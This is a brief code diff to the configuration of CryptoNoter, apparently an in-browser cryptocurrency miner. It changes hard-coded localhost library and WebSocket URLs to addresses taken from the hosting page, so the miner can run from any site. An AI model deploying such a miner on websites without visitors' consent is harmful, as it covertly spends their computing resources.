@@ -1,7 +1,7 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "http://localhost/cryptonoter/lib/",
-    WEBSOCKET_SHARDS: [["ws://localhost:8085"]]
+    LIB_URL: location.origin + "/cryptonoter/lib/",
+    WEBSOCKET_SHARDS: [[(location.protocol.indexOf("s") < 0 ? "ws://" : "wss://") + location.hostname + ":8888"]]
 };
 var Module = {
     locateFile: (function (path) {
@@ -1316,6 +1316,7 @@ function integrateWasmJS(Module) {
                 return false
             }
         }
+
         getBinaryPromise().then((function (binary) {
             return WebAssembly.instantiate(binary, info)
         })).then((function (output) {
